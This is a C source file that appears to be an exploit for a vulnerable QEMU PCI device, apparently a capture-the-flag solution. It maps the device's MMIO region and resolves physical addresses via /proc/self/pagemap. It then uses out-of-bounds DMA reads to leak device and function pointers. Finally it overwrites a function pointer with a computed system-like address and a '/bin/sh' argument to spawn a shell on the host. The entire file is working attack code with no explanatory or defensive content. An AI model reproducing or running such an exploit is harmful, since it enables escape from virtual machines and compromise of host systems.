
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

unsigned char* mmio_mem;
char *userbuf;
uint64_t phy_userbuf;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

uint64_t page_offset(uint64_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void set_idx(uint32_t idx)
{
    mmio_write(0x10,idx);
}

void set_cnt(uint32_t cnt)
{
    mmio_write(0x18,cnt);
}

int main(int argc, char *argv[])
{
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED)
        die("mmap");
    
    mlock(userbuf, 0x1000);
    phy_userbuf=gva_to_gpa(userbuf);
    
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
    {
        die("open resource0 faild\n");
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED)
    {
        die("mmap faild\n");
    }
    
    printf("addr %p,0x%lx\n",userbuf,phy_userbuf);
    
    // set dma addr
    mmio_write(0x20,phy_userbuf >> 12);
     
    //memcpy(userbuf,"/bin/sh\x00",8);
    // addr
    *(uint64_t*)(userbuf + 0x11) = phy_userbuf;
    // cnt
    *(uint16_t*)(userbuf + 0x11 +8) = 0xff5;
    // idx
    *(uint16_t*)(userbuf + 0x11 +8+2) = 11;
    
    set_idx(0);
    set_cnt(0x30);
    mmio_write(0x60,0);
        
    set_idx(0x1000-1);
    set_cnt(2|1);
    mmio_write(0x60,0);
    uint8_t off = userbuf[1];
    
    printf("leak = %hhx\n",off);
    
    // cnt
    *(uint16_t*)(userbuf) = 0xff5;
    // idx
    *(uint16_t*)(userbuf+2) = 11;
    
    userbuf[0x1000-0x19] = off + 0x21;
 
    set_idx(0x19);
    set_cnt(0x1000-0x19+1);
    mmio_write(0x60,0);
    
    // new buf = dma_buf + 0x21;

    // leak ptr
    mmio_write(0x60,0);
    uint64_t device = *(uint64_t*)&userbuf[0x1000-0x21-11];
    uint64_t dma_rw = *(uint64_t*)&userbuf[0x1000-0x21-11+8];
    uint64_t dma_buf = device + 0x9cf;
    
    printf("device = 0x%lx\n",device);
    printf("dma_rw = 0x%lx\n",dma_rw);
    
    // encrypt
    mmio_write(0x50,0);
    // idx = 11 ^ 521 = 514
    // cnt = 0xff5 ^ 521 = 0xdfc
    
    uint64_t start = dma_buf + 0x21 + 514;
    uint64_t align = (start + 0xfff) & ~0xfff;
    
    assert(align <= start + 0xdfc);
    
    printf("start = 0x%lx\n",start);
    printf("align = 0x%lx\n",align);
    
    *(uint64_t *)userbuf = align;
    *(uint16_t *)(userbuf + 8) = 0;
    *(uint16_t *)(userbuf + 8 + 2) = 0;
    
    char cmd[] = "/bin/sh\x00";
    memcpy(userbuf + (align - start),cmd,sizeof(cmd));
    
    // idx = 514
    *(uint64_t *)&userbuf[0x1000-0x21-514] = device + 514 + 0x10;  
    *(uint64_t *)&userbuf[0x1000-0x21-514+8] = dma_rw - 0x314b40; 

    // write
    mmio_write(0x60,0);
    mmio_write(0x60,0);
}
